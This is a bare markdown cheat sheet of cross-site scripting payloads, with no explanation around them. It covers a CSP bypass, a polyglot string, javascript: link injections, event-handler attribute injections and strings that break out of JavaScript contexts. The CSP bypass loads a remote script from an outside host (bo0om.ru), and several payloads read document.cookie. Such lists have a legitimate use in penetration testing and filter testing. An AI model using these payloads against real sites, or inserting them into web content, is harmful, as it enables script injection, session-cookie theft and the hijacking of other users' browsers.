# XSS PAYLOAD 

### CSP BYPASS:

    <script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>


### POLYGLOT:

    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>


### HYPERLINK TAG INJECTION:

    javascript:alert(1)
    
    javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")
    
    javascript://%250Aalert(document.cookie)
    
    javascripT://https://google.com%0aalert(1);//https://google.com
    
    /x:1/:///%01javascript:alert(document.cookie)/


### INLINE HTML INJECTION WITHOUT TAG BREAK:
  
  " onclick=alert(1)//">click
  
  " autofocus onfocus=alert(1) "
  
  " onfocus=prompt(1) autofocus fragment="
  
  " onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"


### JAVASCRIPT INJECTION:

    '?prompt`1`?'
    
    "])},alert(1));(function xss() {//
    
    ""});});});alert(1);$('a').each(function(i){$(this).click(function(event){x({y
    
    "}]}';alert(1);{{'
    
    11111';\u006F\u006E\u0065rror=\u0063onfirm; throw'1
    
    \');confirm(1);//
    
    x");$=alert, $(1);//
    
    '|alert(1)|'
    
    '*prompt(1)*'
    
    "; ||confirm('XSS') || "
    
    "-alert(1)-"
    
    \'-alert(1)};{//
    
    "'-alert(1)-'"
    
    \u0027-confirm`1`-\u0027 
    
    '}};alert(1);{{'



### xss payload

url: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

:+100:
